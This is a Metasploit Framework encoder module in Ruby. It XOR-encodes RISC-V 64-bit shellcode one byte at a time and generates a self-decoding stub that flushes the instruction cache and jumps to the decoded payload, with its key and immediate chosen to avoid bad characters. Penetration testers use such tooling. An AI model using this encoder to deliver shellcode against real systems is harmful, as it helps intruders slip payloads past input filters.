# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Encoder::Xor

  Rank = NormalRanking

  def initialize
    super(
      'Name' => 'Byte XORi Encoder',
      'Description' => %q{
        Byte XOR encoder for RISC-V 64-bit (Little Endian). Encodes the
        payload byte-by-byte with a 1-byte XOR key using the xori
        instruction. Useful when R-type XOR instruction bytes (0x33) are
        bad characters.
      },
      'Author' => ['bcoles'],
      'Arch' => ARCH_RISCV64LE,
      'License' => MSF_LICENSE,
      'Decoder' => {
        'KeySize' => 1,
        'BlockSize' => 1,
        'KeyPack' => 'C'
      }
    )
  end

  #
  # Returns the decoder stub that is adjusted for the size of
  # the buffer being encoded.
  #
  def decoder_stub(state)
    if state.badchars.to_s.include?("\x00")
      raise EncodingError, 'The RISC-V decoder stub inherently contains null bytes (auipc, ecall)'
    end

    byte_count = state.buf.length
    raise EncodingError, 'The payload being encoded is empty' if byte_count.zero?
    raise EncodingError, "The payload being encoded is too long (#{state.buf.length} bytes)" if byte_count > 2047

    xori_imm = find_xori_imm(state.key.to_i, state.badchars)

    # Decoder stub layout (64 bytes = 16 instructions):
    #
    #   0x00: auipc  t0, 0             # t0 = address of this instruction
    #   0x04: addi   t4, t0, 64        # t4 = start of encoded payload
    #   0x08: addi   t2, x0, count     # t2 = number of bytes to decode
    #   0x0c: addi   t0, t4, 0         # t0 = working pointer
    #   0x10: lbu    t3, 0(t0)         # load encoded byte (unsigned)
    #   0x14: xori   t3, t3, IMM       # XOR with key (low 8 bits of immediate)
    #   0x18: sb     t3, 0(t0)         # store decoded byte
    #   0x1c: addi   t0, t0, 1         # advance pointer
    #   0x20: addi   t2, t2, -1        # decrement counter
    #   0x24: bne    t2, x0, -0x14     # loop to 0x10
    #   0x28: addi   a0, t4, 0         # cache flush start address
    #   0x2c: addi   a1, t0, 0         # cache flush end address
    #   0x30: addi   a2, x0, 0         # flags (0 = all harts)
    #   0x34: addi   a7, x0, 259       # __NR_riscv_flush_icache
    #   0x38: ecall                    # flush icache
    #   0x3c: jalr   x0, t4, 0         # jump to decoded payload
    #
    [
      0x00000297,                       # auipc  t0, 0
      encode_addi(29, 5, 64),           # addi   t4, t0, 64
      encode_addi(7, 0, byte_count),    # addi   t2, x0, count
      encode_addi(5, 29, 0),            # addi   t0, t4, 0
      encode_lbu(28, 5, 0),             # lbu    t3, 0(t0)
      encode_xori_insn(28, 28, xori_imm), # xori t3, t3, imm
      encode_sb(28, 5, 0),              # sb     t3, 0(t0)
      encode_addi(5, 5, 1),             # addi   t0, t0, 1
      encode_addi(7, 7, -1),            # addi   t2, t2, -1
      encode_bne(7, 0, -20),            # bne    t2, x0, loop
      encode_addi(10, 29, 0),           # addi   a0, t4, 0
      encode_addi(11, 5, 0),            # addi   a1, t0, 0
      encode_addi(12, 0, 0),            # addi   a2, x0, 0
      encode_addi(17, 0, 259),          # addi   a7, x0, 259
      0x00000073,                       # ecall
      encode_jalr(0, 29, 0),            # jalr   x0, t4, 0
    ].pack('V*')
  end

  #
  # Verify that the candidate key produces a valid xori immediate
  # whose instruction encoding avoids bad characters.
  #
  def find_key_verify(buf, key_bytes, badchars)
    return false unless super

    key = key_bytes_to_integer(key_bytes)
    find_xori_imm(key, badchars)
    true
  rescue EncodingError
    false
  end

  private

  # Find a 12-bit immediate for the xori instruction that avoids bad characters
  # in its encoding. Only the low 8 bits affect the XOR result since sb stores
  # only the low byte, so bits [11:8] can be set freely.
  def find_xori_imm(key, badchars)
    # Try upper nibbles 1-15 first (avoids null byte in instruction word)
    (1..15).each do |hi|
      imm12 = (hi << 8) | (key & 0xFF)
      bytes = [encode_xori_insn(28, 28, imm12)].pack('V')
      return imm12 if Rex::Text.badchar_index(bytes, badchars).nil?
    end
    # Fallback: try with no upper bits
    imm12 = key & 0xFF
    bytes = [encode_xori_insn(28, 28, imm12)].pack('V')
    return imm12 if Rex::Text.badchar_index(bytes, badchars).nil?

    raise EncodingError, "The #{name} encoder failed to avoid bad characters in the xori instruction"
  end

  # I-type: ADDI rd, rs1, imm12
  def encode_addi(rd, rs1, imm12)
    ((imm12 & 0xfff) << 20) | (rs1 << 15) | (rd << 7) | 0b0010011
  end

  # I-type: LBU rd, imm12(rs1)
  def encode_lbu(rd, rs1, imm12)
    ((imm12 & 0xfff) << 20) | (rs1 << 15) | (0b100 << 12) | (rd << 7) | 0b0000011
  end

  # S-type: SB rs2, imm12(rs1)
  def encode_sb(rs2, rs1, imm12)
    imm = imm12 & 0xfff
    (((imm >> 5) & 0x7f) << 25) | (rs2 << 20) | (rs1 << 15) | ((imm & 0x1f) << 7) | 0b0100011
  end

  # I-type: XORI rd, rs1, imm12
  def encode_xori_insn(rd, rs1, imm12)
    ((imm12 & 0xfff) << 20) | (rs1 << 15) | (0b100 << 12) | (rd << 7) | 0b0010011
  end

  # B-type: BNE rs1, rs2, offset
  def encode_bne(rs1, rs2, offset)
    imm = offset & 0x1fff
    bit12 = (imm >> 12) & 1
    bit11 = (imm >> 11) & 1
    hi6 = (imm >> 5) & 0x3f
    lo4 = (imm >> 1) & 0xf
    (bit12 << 31) | (hi6 << 25) | (rs2 << 20) | (rs1 << 15) |
      (0b001 << 12) | (lo4 << 8) | (bit11 << 7) | 0b1100011
  end

  # I-type: JALR rd, rs1, imm12
  def encode_jalr(rd, rs1, imm12)
    ((imm12 & 0xfff) << 20) | (rs1 << 15) | (rd << 7) | 0b1100111
  end
end
